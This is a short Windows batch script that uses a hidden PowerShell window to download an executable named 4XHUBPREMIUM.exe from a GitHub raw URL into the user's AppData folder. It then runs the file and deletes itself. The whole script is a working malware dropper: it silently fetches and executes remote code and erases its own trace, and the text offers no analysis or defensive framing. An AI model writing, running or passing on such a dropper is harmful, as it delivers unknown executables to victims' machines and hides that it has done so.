@echo off
set "URL=https://github.com/emad8787/panel/raw/refs/heads/main/4XHUBPREMIUM.exe"
set "SAVE_PATH=%appdata%\4XHUBPREMIUM.exe"

:: Download silently
powershell -WindowStyle Hidden -Command ^
"Invoke-WebRequest -Uri '%URL%' -OutFile '%SAVE_PATH%'"

:: Run the file if download succeeded
if exist "%SAVE_PATH%" (
    start "" "%SAVE_PATH%"
)

:: Delete this .bat file
(del "%~f0") & exit
